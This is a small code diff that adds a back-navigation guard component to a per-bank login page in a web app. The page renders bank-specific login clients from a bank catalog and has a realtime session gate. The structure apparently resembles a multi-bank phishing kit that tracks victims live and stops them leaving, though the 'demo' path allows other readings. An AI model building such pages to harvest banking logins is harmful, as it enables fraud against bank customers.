@@ -1,5 +1,6 @@
 import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
 import { BankLoginClient } from "./bank-login-client";
+import { BankPageBackGuard } from "./bank-page-back-guard";
 import { getBankBySlug } from "@/lib/at-bank-catalog";
 import { renderDedicatedBankClient } from "@/lib/bank-client-registry";
 import { resolveServerSessionIdentity } from "@/lib/session-id";
@@ -27,6 +28,7 @@ export default async function BankLoginPage({ params }: Props) {
   return (
     <>
       <SessionRealtimeGate sessionId={sessionId} routeSessionId={routeSessionId} />
+      <BankPageBackGuard sessionId={sessionId} />
       {dedicatedClient ? (
         dedicatedClient ?? null
       ) : (
